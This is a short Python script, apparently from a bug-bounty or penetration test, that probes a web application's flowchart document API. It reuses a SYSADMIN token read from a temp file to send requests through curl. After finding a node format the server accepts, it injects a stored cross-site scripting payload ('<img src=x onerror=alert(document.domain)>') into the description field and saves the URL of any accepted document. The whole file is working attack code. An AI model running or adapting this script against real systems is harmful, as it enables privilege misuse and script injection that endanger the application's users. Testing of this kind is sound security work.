import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(body):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/documents/flowchart',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
print("=== node with nextStep ===")
for body in [
 [{"id":"1","description":f"ZX{tag}","nextStep":[]}],
 [{"id":"1","description":f"ZX{tag}","nextStep":[],"type":"start"}],
]:
    c,b=req(body)
    print(f"  {list(body[0].keys())} -> {c} {b[:250].replace(chr(10),' ')}")
    if c=='200':
        d=json.loads(b); print(f"    *** ACCEPTED url={d.get('url','')[:100]}")
        open('/tmp/flow_url','w').write(d.get('url',''))
        break
print()
print("=== now inject HTML into description ===")
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for body in [
 [{"id":"1","description":pay,"nextStep":[]}],
 [{"id":"1","description":f"<b>{tag}</b>","nextStep":[]}],
]:
    c,b=req(body)
    print(f"  desc={body[0]['description'][:40]!r} -> {c} {b[:200].replace(chr(10),' ')}")
    if c=='200':
        d=json.loads(b); print(f"    *** ACCEPTED url={d.get('url','')[:100]}")
        open('/tmp/flow_pay_url','w').write(d.get('url',''))
